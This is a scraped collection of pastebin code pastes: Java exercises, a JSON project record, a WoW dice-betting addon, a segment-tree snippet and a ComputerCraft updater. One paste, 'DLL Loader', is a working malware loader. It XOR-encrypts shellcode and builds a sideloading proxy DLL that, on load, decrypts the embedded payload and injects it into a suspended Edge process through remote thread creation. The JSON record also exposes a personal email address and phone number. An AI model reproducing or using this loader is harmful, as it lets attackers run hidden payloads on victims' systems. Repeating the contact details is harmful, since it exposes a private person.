id,title,username,language,date,content
Zzw1T2xG,Untitled,Josif_tepe,Java,Tuesday 17th of June 2025 01:04:05 PM CDT,"import java.util.Random;

class Tocka {
    private double x;
    private double y;


    public Tocka(double x, double y) {
        this.x = x;
        this.y = y;
    }

    public double getX() {
        return x;
    }
    public double getY() {
        return y;
    }
    public void setX(double x) {
        this.x = x;
    }
    public void setY(double y) {
        this.y = y;
    }

}
public class Naloga14 {
    static Tocka sredina(Tocka a, Tocka b) {
        return new Tocka(0.5 * (a.getX() + b.getX()), 0.5 * (a.getY() + b.getY()));
    }
    public static void main(String[] args) {
        StdDraw.setScale(0, 100);
         Tocka[] tocki = new Tocka[3];
         tocki[0] = new Tocka(10, 10);
         tocki[1] = new Tocka(90, 10);
         tocki[2] = new Tocka(50, 90);

         Random random = new Random();

         int x = random.nextInt(100);
         int y;
         if(x < 50) {
            y = 2 * x + 1;
         }
         else {
            y = 2 * (100 - x)+ 1;
         }
         Tocka tocka = new Tocka(x, y);

         for(int i = 0; i < 10000; i++) {
            int j = random.nextInt(3);
            Tocka sredisnaTocka = sredina(tocki[j], tocka);

            StdDraw.line(sredisnaTocka.getX(), sredisnaTocka.getY(), sredisnaTocka.getX(), sredisnaTocka.getY());
            tocka = sredisnaTocka;
         }
    }
}
"
xuAMPwQ6,Untitled,Josif_tepe,Java,Tuesday 17th of June 2025 12:28:49 PM CDT,"import java.io.File;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Scanner;

class Drzava {
    private String kratenica;
    private String drzava;
    private int brojZiteli;

    public Drzava(String kratenica, String drzava, int brojZiteli) {
        this.kratenica = kratenica;
        this.drzava = drzava;
        this.brojZiteli = brojZiteli;
    }

    public String getKratenica() {
        return kratenica;
    }
    public String getDrzava() {
        return drzava;
    }
    public int getBrojZiteli() {
        return brojZiteli;
    }
    public void setKratenica(String kratenica) {
        this.kratenica = kratenica;
    }
    public void setDrzava(String drzava) {
        this.drzava = drzava;
    }
    public void setBroZiteli(int brojZiteli) {
        this.brojZiteli = brojZiteli;
    }
    public int presmetajMilioni() {
        return Math.round((float) brojZiteli / 1000000f);
    }
}
public class Naloga13 {
    static HashMap<String, Drzava> preberiDrzava(String imeDatoteke) {
        HashMap<String, Drzava> map = new HashMap<>();

        try {
            Scanner scanner = new Scanner(new File(imeDatoteke));
            while(scanner.hasNextLine()) {
                String line = scanner.nextLine();
                String[] niza = line.split("":"");
                map.put(niza[0], new Drzava(niza[0], niza[1], Integer.parseInt(niza[2])));
            }

        }
        catch(Exception e) {
            System.out.println(""Error "" + e);
        }

        return map;
    }
    public static void main(String[] args) {
        HashMap<String, Drzava> map = preberiDrzava(args[0]);
        ArrayList<String> keys = new ArrayList<>(map.keySet());

        keys.sort(new Comparator<String>() {
            @Override
            public int compare(String a, String b) {
                Drzava d1 = map.get(a);
                Drzava d2 = map.get(b);

                if(d1.presmetajMilioni() == d2.presmetajMilioni()) {
                    return d1.getDrzava().compareTo(d2.getDrzava());
                }
                
                return d1.presmetajMilioni() - d2.presmetajMilioni();
            }
        }); 
        
        int current_million = -1;
        for(int i = 0; i < keys.size(); i++) {
            String drzava = keys.get(i);

            Drzava d = map.get(drzava);

            if(current_million != d.presmetajMilioni()) {
                current_million = d.presmetajMilioni();
                System.out.println(current_million + ""M"");
            }
            System.out.println(""  - "" + d.getDrzava() + "" ("" + d.getKratenica() + ""), "" + d.getBrojZiteli());
        }
        
    }
}
"
fjibJ55t,Untitled,bebo231312312321,JavaScript,Tuesday 17th of June 2025 12:05:41 PM CDT,"{
    ""title"": ""dasdsadsa"",
    ""slug"": ""dasdsadsa"",
    ""shortDescription"": ""dsadsadsa"",
    ""mainImage"": {
        ""src"": """",
        ""alt"": """",
        ""caption"": """",
        ""gallery"": []
    },
    ""category"": ""Environment"",
    ""location"": {
        ""address"": ""бл. 28, ж.к. Разсадника-Коньовица, ж.к. Разсадник-Коньовица, София, Красна поляна, Столична, София-град, 1379, България"",
        ""coordinates"": {
            ""lat"": 42.69685314805044,
            ""lng"": 23.29135894775391
        }
    },
    ""status"": ""active"",
    ""campaignStatus"": ""open"",
    ""commentsEnabled"": true,
    ""contact"": {
        ""name"": ""dsadsa"",
        ""position"": ""dsadsa"",
        ""email"": ""borislaviliev47@gmail.com"",
        ""phone"": ""+359894371779"",
        ""image"": """"
    },
    ""additionalContacts"": [],
    ""sections"": [
        {
            ""titleSlug"": ""section-1750178285037"",
            ""title"": ""dsadsa"",
            ""content"": ""<p>dsadsadsa</p>"",
            ""images"": [
                {
                    ""src"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fsections%2Fsection-0%2F38b41824-0786-4cc9-8681-2f5eecf2fa11?alt=media&token=7705d07f-0816-4945-af3a-6b2620d53545"",
                    ""alt"": ""dsa"",
                    ""caption"": ""dasdsa"",
                    ""isUploading"": false
                }
            ]
        }
    ],
    ""downloadMaterials"": [],
    ""projects"": [],
    ""stories"": [],
    ""publications"": [],
    ""detailedDescription"": ""<p>dsadsadsadsadsadsa</p>"",
    ""customCategory"": """",
    ""priority"": ""Medium"",
    ""startDate"": ""2025-06-12"",
    ""endDate"": """",
    ""duration"": """",
    ""milestones"": [],
    ""targetAge"": [
        ""All ages""
    ],
    ""targetAudience"": [],
    ""customAudience"": ""dsadsadsasaas"",
    ""expectedBudget"": ""432"",
    ""currency"": ""BGN"",
    ""fundingSources"": [
        ""Sponsors"",
        ""Self-funded""
    ],
    ""partners"": [
        {
            ""id"": ""1750178329729-i6v2lpwet"",
            ""name"": ""dsadsasa"",
            ""description"": ""dsadsadsa"",
            ""website"": """",
            ""type"": ""Strategic"",
            ""logo"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fpartners%2F0a3832aa-7633-450b-819b-2981ab6e810d?alt=media&token=0b4a42a5-5536-4a92-9db0-f1006420e676"",
            ""visible"": true
        }
    ],
    ""sponsors"": [],
    ""logo"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Flogos%2F48c20117-36a9-4190-921b-34e2a7e46c85?alt=media&token=0e3ae544-2c73-485e-8495-8b1169b19792"",
    ""responsible"": {
        ""name"": ""dsasaddsa"",
        ""position"": """",
        ""email"": ""borislaviliev47@gmail.com"",
        ""phone"": ""+359894371779""
    },
    ""organization"": {
        ""name"": ""dsasasad"",
        ""address"": ""dsadsadsaasdsadsadsa "",
        ""website"": """"
    },
    ""socialMedia"": {
        ""facebook"": """",
        ""instagram"": """",
        ""linkedin"": """",
        ""twitter"": """"
    },
    ""kpis"": [],
    ""expectedResults"": ""<p>dsadsadsa</p>"",
    ""progressReport"": ""<p>dsadsadsa</p>"",
    ""impactMetrics"": [],
    ""testimonials"": [],
    ""tags"": [],
    ""relatedInitiatives"": [],
    ""faq"": [],
    ""gallery"": [
        {
            ""src"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fgallery%2Fc6ccd133-b77d-4150-8439-17533ce8fe6a?alt=media&token=3f2e0592-4441-420d-9f85-a22f7fdb82ce"",
            ""alt"": ""da"",
            ""caption"": ""dsadsasda"",
            ""isUploading"": false
        }
    ],
    ""createdAt"": ""2025-06-17T16:40:33.158Z"",
    ""updatedAt"": ""2025-06-17T16:40:33.158Z""
}"
6eTY9VY5,DiceGames.lua,Kaev,Lua,Tuesday 17th of June 2025 11:36:23 AM CDT,"-- Chat Config values
local TRADE_GOLD_RECEIVED_ANNOUNCEMENT = ""%s Bets %s!""; -- First %s is the players name, second %s is the gold amount
local TRADE_GOLD_GIVEN_ANNOUNCEMENT = ""%s received %s!""; -- First %s is the players name, second %s is the gold amount
local GOLD = ""%d Gold"";
local SILVER = ""%d Silver"";
local COPPER = ""%d Copper"";

-- Dice Config Values
local GAME_DICE_KEYWORD_OVER = ""over"";
local GAME_DICE_KEYWORD_UNDER = ""under"";
local GAME_DICE_WIN_MESSAGE = ""Congratulations %s! You won the dice game! We rolled %s and you picked %s.""; -- First %s is the players name, second %s is the total rolled, third %s is the players choice (over or under)
local GAME_DICE_LOSE_MESSAGE = ""Sorry %s! You lost the dice game! We rolled %s and you picked %s.""; -- First %s is the players name, second %s is the total rolled, third %s is the players choice (over or under)

-- Don't change anything below this line
local GAME_DICE_ROLL_COUNT = 2; -- Don't change! There is a hard check for the value 7 in this addon. Any change will break the game.

-- Prize Stuff
local OPEN_PRIZES = {};

local function AddOpenPrize(playerName, amount)
    if (OPEN_PRIZES[playerName] == nil) then
        OPEN_PRIZES[playerName] = amount;
    else
        OPEN_PRIZES[playerName] = OPEN_PRIZES[playerName] + amount;
    end
end

local function HasOpenPrize(playerName)
    return OPEN_PRIZES[playerName] ~= nil and OPEN_PRIZES[playerName] > 0;
end

local function GetOpenPrize(playerName)
    return OPEN_PRIZES[playerName] or 0;
end

local function UpdateOpenPrize(playerName, amount)
    if (OPEN_PRIZES[playerName] == nil) then
        OPEN_PRIZES[playerName] = 0;
        return;
    end

    OPEN_PRIZES[playerName] = math.max(0, OPEN_PRIZES[playerName] - amount);
end

-- Game stuff
local CURRENT_GAMES = {};

local function StartNewGame(playerName, betAmount)
    CURRENT_GAMES[playerName] = {
        gamemode = ""dice"",
        player = playerName,
        choice = nil, -- over or under
        bet = betAmount,
        rolls = {},
        total = 0,
        winner = nil
    };
end

local function RemoveFinishedGame(game)
    CURRENT_GAMES[game.player] = nil;
end

local function HasCurrentGame(playerName)
    return CURRENT_GAMES[playerName] ~= nil;
end

local function GetCurrentGame(playerName)
    return CURRENT_GAMES[playerName];
end

local function DoGameRolls(game)
    if (game.gamemode == ""dice"") then
        for i=1, GAME_DICE_ROLL_COUNT do
            RandomRoll(1, 6);
        end
    end
end

local function IsGameUnfinished(game)
    if (game.gamemode == ""dice"") then
        return game.winner == nil and game.choice ~= nil
    end
end

local function GetFirstUnfinishedGame()
    for playerName, game in pairs(CURRENT_GAMES) do
        if IsGameUnfinished(game) then
            return game;
        end
    end
    return nil;
end

local function AssignRollToGame(game, roll)
    if (game.gamemode == ""dice"") then
        game.rolls[#game.rolls + 1] = roll;
        game.total = game.total + roll;
    end
end

local function HandleGameLogic(game)
    if (game.gamemode == ""dice"") then
        if (#game.rolls < GAME_DICE_ROLL_COUNT) then
            return; -- Not enough rolls yet
        end

        if (game.choice == GAME_DICE_KEYWORD_OVER and game.total > 7) or (game.choice == GAME_DICE_KEYWORD_UNDER and game.total < 7) then
            game.winner = game.player;
            local msg = GAME_DICE_WIN_MESSAGE:format(game.player, game.total, game.choice);
            SendChatMessage(msg, ""YELL"");
            AddOpenPrize(game.player, game.bet * 2);
            InitiateTrade(game.player);
        else
            game.winner = UnitName(""player"");
            local msg = GAME_DICE_LOSE_MESSAGE:format(game.player, game.total, game.choice);
            SendChatMessage(msg, ""YELL"");
        end

        RemoveFinishedGame(game);
    end
end

-- Trade stuff
local ROLL_PATTERN = RANDOM_ROLL_RESULT
  :gsub(""[%-%(%)]"", ""%%%1"") -- Escape special chars
  :gsub(""%%%d%$s"", ""(%%S+)"") -- Prepare player name
  :gsub(""%%%d%$d"", ""(%%d+)"") -- Prepare roll numbers

local CURRENT_TRADE = {
    name = """",
    playerGold = 0,
    targetGold = 0
}

local function ResetCurrentTrade()
    CURRENT_TRADE.name = """";
    CURRENT_TRADE.playerGold = 0;
    CURRENT_TRADE.targetGold = 0;
end

local function CopperToMoneyString(copper)
    if (copper == nil or copper <= 0) then
        return ""-Nothing-"";
    end

    local gold = math.floor(copper / 10000);
    local silver = math.floor((copper % 10000) / 100);
    local copper = copper % 100;
    return string.trim(string.format(""%s %s %s"", 
        gold > 0 and string.format(GOLD, gold) or """",
        silver > 0 and string.format(SILVER, silver) or """",
        copper > 0 and string.format(COPPER, copper) or """"));
end

local function TradeComplete()
    if (TRADE_GOLD_RECEIVED_ANNOUNCEMENT ~= """" and CURRENT_TRADE.targetGold > 0) then
        local msg = TRADE_GOLD_RECEIVED_ANNOUNCEMENT:format(CURRENT_TRADE.name, CopperToMoneyString(CURRENT_TRADE.targetGold));
        SendChatMessage(msg, ""YELL"");
    end

    if (TRADE_GOLD_GIVEN_ANNOUNCEMENT ~= """" and CURRENT_TRADE.playerGold > 0) then
        local msg = TRADE_GOLD_GIVEN_ANNOUNCEMENT:format(CURRENT_TRADE.name, CopperToMoneyString(CURRENT_TRADE.playerGold));
        SendChatMessage(msg, ""YELL"");
        UpdateOpenPrize(CURRENT_TRADE.name, tonumber(CURRENT_TRADE.playerGold));
    end

    if (CURRENT_TRADE.targetGold > 0) then
        StartNewGame(CURRENT_TRADE.name, CURRENT_TRADE.targetGold);
    end

    ResetCurrentTrade();
end

local function OnTradeRequestCancel()
    ResetCurrentTrade();
end

local function OnTradeShow()
    local traderName = strtrim(_G.TradeFrameRecipientNameText:GetText());
    ResetCurrentTrade();
    CURRENT_TRADE.name = traderName;
    CURRENT_TRADE.playerGold = 0;
    CURRENT_TRADE.targetGold = 0;

    if (HasOpenPrize(traderName)) then
        local openPrize = GetOpenPrize(traderName);
        print(""Open prize found for ""..traderName.."": ""..CopperToMoneyString(openPrize));
    end
end

local function OnTradeMoneyChanged()
    CURRENT_TRADE.playerGold = tonumber(GetPlayerTradeMoney()) or 0;
    CURRENT_TRADE.targetGold = tonumber(GetTargetTradeMoney()) or 0;
end

local function OnUiInfoMessage(message)
    if (message == ERR_TRADE_COMPLETE) then
        TradeComplete();
    end
end

local TIMER_ELAPSED = 0;
local function OnUpdate(elapsed)
    if (not TradeFrame:IsShown()) then
        return;
    end
    TIMER_ELAPSED = TIMER_ELAPSED + elapsed;
    if (TIMER_ELAPSED > 0.05) then
        CURRENT_TRADE.playerGold = tonumber(GetPlayerTradeMoney()) or 0;
        CURRENT_TRADE.targetGold = tonumber(GetTargetTradeMoney()) or 0;
    end
end

-- General stuff
local function OnSystemMessage(message)
    local name, roll, min, max = message:match(ROLL_PATTERN)
    if name and name == UnitName(""player"") then -- Only handle rolls for us
        local game = GetFirstUnfinishedGame();
        if (game == nil) then
            return; -- No game to handle
        end
        AssignRollToGame(game, tonumber(roll));
        HandleGameLogic(game)
    end
end

local function OnChatMessage(message, playerName)
    if (HasCurrentGame(playerName)) then
        local lowerMessage = string.lower(message);
        if (lowerMessage == string.lower(GAME_DICE_KEYWORD_OVER) or lowerMessage == string.lower(GAME_DICE_KEYWORD_UNDER)) then
            local game = GetCurrentGame(playerName);
            game.choice = lowerMessage;
            DoGameRolls(game);
        end
    end
end

local eventHandlers = {
    [""CHAT_MSG_SYSTEM""] = OnSystemMessage,
    [""CHAT_MSG_SAY""] = OnChatMessage,
    [""TRADE_REQUEST_CANCEL""] = OnTradeRequestCancel,
    [""TRADE_SHOW""] = OnTradeShow,
    [""TRADE_MONEY_CHANGED""] = OnTradeMoneyChanged,
    [""UI_INFO_MESSAGE""] = OnUiInfoMessage
}

local frame = CreateFrame(""Frame"");
frame:RegisterEvent(""CHAT_MSG_SYSTEM"");
frame:RegisterEvent(""CHAT_MSG_SAY"");
frame:RegisterEvent(""TRADE_ACCEPT_UPDATE"");
frame:RegisterEvent(""TRADE_REQUEST_CANCEL"");
frame:RegisterEvent(""TRADE_SHOW"");
frame:RegisterEvent(""TRADE_CLOSED"");
frame:RegisterEvent(""TRADE_MONEY_CHANGED"");
frame:RegisterEvent(""UI_INFO_MESSAGE"")
frame:SetScript(""OnEvent"", function(self, event, ...)
    local args = {...};
    local eventHandler = eventHandlers[event];
    if eventHandler then
        eventHandler(unpack(args));
    end
end);
frame:HookScript(""OnUpdate"", function(self, elapsed)
    OnUpdate(elapsed);
end);

SLASH_DICEGAMES1 = ""/dicegames"";
SLASH_DICEGAMES2 = ""/dg"";
SlashCmdList[""DICEGAMES""] = function(message)
    print(""Open prizes:"");
    for player, amount in pairs(OPEN_PRIZES) do
        if (amount >= 1) then
            print(player.."": ""..CopperToMoneyString(amount));
        end
    end
    print(""Open games:"");
    for playerName, game in pairs(CURRENT_GAMES) do
        print(playerName, game, game.bet, game.choice);
    end
end"
wKSzqPWC,k-я единица ДО,nq1s788,C++,Tuesday 17th of June 2025 11:31:09 AM CDT,"int get(int t, int l, int r, int k) {
    if (r - l == 1) {
        return l;
    }
    int m = (r + l) / 2;
    if (k > tree[2 * t + 1]) {
        get(t * 2 + 2, m, r, k - tree[2 * t + 1]);
    } else {
        get(t * 2 + 1, l, m, k);
    }
}

void update(int t, int l, int r, int x) {
    if (x < l || r <= x) {
        return;
    }
    if (r - l == 1) {
        tree[t] ^= 1;
        return;
    }
    int m = (l + r) / 2;
    update(t * 2 + 1, l, m, x);
    update(t * 2 + 2, m, r, x);
    tree[t] = tree[t * 2 + 1] + tree[t * 2 + 2];
}"
m8jeRd4D,DLL Loader,EngEhabFahmi,C++,Tuesday 17th of June 2025 11:16:29 AM CDT,"// DLL Loader
// https://www.7-zip.org/download.html
// ===============================================================
// 1st file:
 
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
 
// Function to XOR encrypt the buffer using the provided key
void xorEncrypt(std::vector<unsigned char>& buf, const std::string& key) {
    size_t keyLen = key.length();
    for (size_t i = 0; i < buf.size(); ++i) {
        buf[i] ^= key[i % keyLen];
    }
}
 
int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << ""Usage: "" << argv[0] << "" <input_shellcode> <xor_key> <output_file>"" << std::endl;
        return 1;
    }
 
    std::string inputFile = argv[1];
    std::string key = argv[2];
    std::string outputFile = argv[3];
 
    // Open input shellcode file
    std::ifstream file(inputFile, std::ios::binary);
    if (!file) {
        std::cerr << ""Error: Cannot open input file."" << std::endl;
        return 1;
    }
 
    // Read the file into a buffer
    std::vector<unsigned char> buf((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
 
    if (buf.empty()) {
        std::cerr << ""Error: Input shellcode file is empty."" << std::endl;
        return 1;
    }
 
    // XOR encrypt the buffer
    xorEncrypt(buf, key);
 
    // Write XORed shellcode to output file
    std::ofstream outFile(outputFile, std::ios::binary);
    if (!outFile) {
        std::cerr << ""Error: Cannot create output file."" << std::endl;
        return 1;
    }
 
    outFile.write(reinterpret_cast<char*>(buf.data()), buf.size());
    outFile.close();
 
    std::cout << ""[+] Shellcode encrypted and saved to: "" << outputFile << std::endl;
 
    return 0;
}
 
// ===============================================================
// 2nd File: 

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <thread>
#include <random>
#include ""resource.h""
 
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)
 
#pragma comment(linker, ""/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1"")
#pragma comment(linker, ""/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2"")
#pragma comment(linker, ""/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3"")
#pragma comment(linker, ""/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4"")
#pragma comment(linker, ""/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5"")
#pragma comment(linker, ""/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6"")
#pragma comment(linker, ""/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7"")
#pragma comment(linker, ""/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8"")
#pragma comment(linker, ""/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9"")
#pragma comment(linker, ""/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10"")
#pragma comment(linker, ""/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11"")
 
const char key[] = ""Uoajs2@ahiushidasd"";
 
 
// Enhanced debugging function with timestamp and process ID
void DebugLog(const char* msg, LPVOID ptr = nullptr) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    printf(""[%02d:%02d:%02d.%03d] [PID: %d] %s"",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
        GetCurrentProcessId(), msg);
 
    if (ptr) {
        printf("" [Pointer: 0x%p]"", ptr);
    }
    printf(""\n"");
}
 
void PauseForDebug(const char* msg) {
    DebugLog(msg);
    std::cout << ""Press Enter to continue..."";
    std::cin.ignore();
}
 
void HexDump(const void* data, size_t size) {
    const unsigned char* p = (const unsigned char*)data;
    printf(""Hex dump (%zu bytes):\n"", size);
    for (size_t i = 0; i < size; ++i) {
        printf(""%02X "", p[i]);
        if ((i + 1) % 16 == 0 || i == size - 1) {
            printf(""\n"");
        }
    }
}
 
void DecryptShellcode(BYTE* data, DWORD size) {
    //DebugLog(""Starting shellcode decryption..."");
    int keyLength = sizeof(key) - 1;
 
    //DebugLog(""Shellcode before decryption:"");
    HexDump(data, min(size, 32)); // Show first 32 bytes
 
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key[i % keyLength];
    }
 
    //DebugLog(""Shellcode after decryption:"");
    HexDump(data, min(size, 32)); // Show first 32 bytes
    //DebugLog(""Shellcode decryption completed"");
}
 
void InjectShellcodeIntoNotepad() {
    DebugLog(""Starting shellcode injection process"");
 
    // Create notepad.exe process suspended
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
 
    if (!CreateProcess(L""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DebugLog(""[!] Failed to create notepad process!"");
        return;
    }
 
    DebugLog(""Notepad.exe created successfully (suspended)"");
    DebugLog(""Notepad process information:"", pi.hProcess);
    printf(""  Process ID: %d\n"", pi.dwProcessId);
    printf(""  Thread ID: %d\n"", pi.dwThreadId);
    PauseForDebug(""Notepad process created - check with Process Explorer"");
 
    HMODULE hModule = NULL;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)InjectShellcodeIntoNotepad, &hModule)) {
        DebugLog(""[!] Failed to get module handle!"");
        return;
    }
    DebugLog(""Module handle obtained:"", hModule);
    PauseForDebug(""Module handle fetched - ready to access resources"");
 
    // Find and load the resource
    DebugLog(""Locating resource..."");
    HRSRC resHandle = FindResource(hModule, MAKEINTRESOURCE(IDR_SHELL1), L""SHELL"");
    if (!resHandle) {
        DebugLog(""[!] Resource not found!"");
        return;
    }
    DebugLog(""Resource found:"", resHandle);
 
    DWORD resSize = SizeofResource(hModule, resHandle);
    HGLOBAL resData = LoadResource(hModule, resHandle);
    void* resPtr = LockResource(resData);
 
    if (!resPtr || resSize == 0) {
        DebugLog(""[!] Failed to load resource data!"");
        return;
    }
 
    DebugLog(""Resource loaded successfully"");
    printf(""  Resource size: %d bytes\n"", resSize);
    printf(""  Resource pointer: 0x%p\n"", resPtr);
    PauseForDebug(""Resource loaded - ready to process"");
 
    // Allocate memory for shellcode
    BYTE* pShellcode = (BYTE*)VirtualAlloc(0, resSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pShellcode == NULL) {
        DebugLog(""[!] Memory allocation failed!"");
        return;
    }
 
    DebugLog(""Memory allocated for shellcode:"", pShellcode);
    printf(""  Allocation size: %d bytes\n"", resSize);
    PauseForDebug(""Memory allocated - ready to copy shellcode"");
 
    // Copy resource data to allocated memory
    memcpy(pShellcode, resPtr, resSize);
    DebugLog(""Shellcode copied to allocated memory"");
    PauseForDebug(""Shellcode copied - ready to decrypt"");
 
    // Decrypt the shellcode
    //DebugLog(""Starting shellcode decryption..."");
    DecryptShellcode(pShellcode, resSize);
    //PauseForDebug(""Shellcode decrypted - ready to inject"");
 
    // Allocate memory in the notepad process
    LPVOID pRemoteShellcode = VirtualAllocEx(pi.hProcess, NULL, resSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteShellcode) {
        //DebugLog(""[!] Failed to allocate memory in target process!"");
        return;
    }
 
    DebugLog(""Memory allocated in Notepad process:"", pRemoteShellcode);
    printf(""  Allocation size: %d bytes\n"", resSize);
    PauseForDebug(""Remote memory allocated - ready to write shellcode"");
 
    // Write the decrypted shellcode into the allocated memory
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, pRemoteShellcode, pShellcode, resSize, &bytesWritten)) {
        //DebugLog(""[!] Failed to write shellcode to Notepad process!"");
        return;
    }
 
    DebugLog(""Shellcode written to Notepad process"");
    printf(""  Bytes written: %zu/%d\n"", bytesWritten, resSize);
    PauseForDebug(""Shellcode written - ready to execute"");
 
    // Create a remote thread in the notepad process to execute the shellcode
    DebugLog(""Creating remote thread..."");
    system(""pause"");
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    if (!hThread) {
        //DebugLog(""[!] Failed to create remote thread!"");
        return;
    }
 
    DebugLog(""Remote thread created successfully:"", hThread);
    printf(""  Thread ID: %d\n"", GetThreadId(hThread));
    PauseForDebug(""Remote thread created - shellcode executing"");
 
    // Wait for the thread to complete (optional)
    DebugLog(""Waiting for shellcode execution to complete..."");
    //WaitForSingleObject(hThread, INFINITE);
 
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    DebugLog(""Shellcode execution completed"");
    printf(""  Exit code: 0x%08X\n"", exitCode);
 
    // Clean up
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
 
    // Free local shellcode memory
    VirtualFree(pShellcode, 0, MEM_RELEASE);
    //DebugLog(""Injection process completed successfully"");
    //PauseForDebug(""EXITing...."");
}
 
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        DebugLog(""DLL attached to process"");
        //Sleep(12000);
        InjectShellcodeIntoNotepad();
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"
ZDcrJian,initupdate.lua,Ubidibity,Lua,Tuesday 17th of June 2025 11:12:24 AM CDT,"-- initupdate.lua: Downloads the latest init.lua from Pastebin

local function updateProgram(pastebinCode, programName)
  print(""Starting update process for "" .. programName .. ""..."")
  if fs.exists(programName) then
    print(""Deleting old version of "" .. programName .. ""..."")
    fs.delete(programName)
    if not fs.exists(programName) then
      print(""Old version deleted successfully."")
    else
      error(""Failed to delete old version of "" .. programName)
    end
  else
    print(""No old version of "" .. programName .. "" found."")
  end

  print(""Downloading new version from Pastebin..."")
  local success = shell.run(""pastebin"", ""get"", pastebinCode, programName)
  if success then
    print(""Successfully downloaded "" .. programName .. "" from Pastebin."")
    print(""Update complete! You can now run "" .. programName .. ""."")
  else
    error(""Failed to download "" .. programName .. "" from Pastebin. Check the Pastebin code or internet connection."")
  end
end

-- Update init.lua
local programName = ""init.lua""
local pastebinCode = ""ypw1WRQa"" -- Replace with actual Pastebin code
updateProgram(pastebinCode, programName)
"
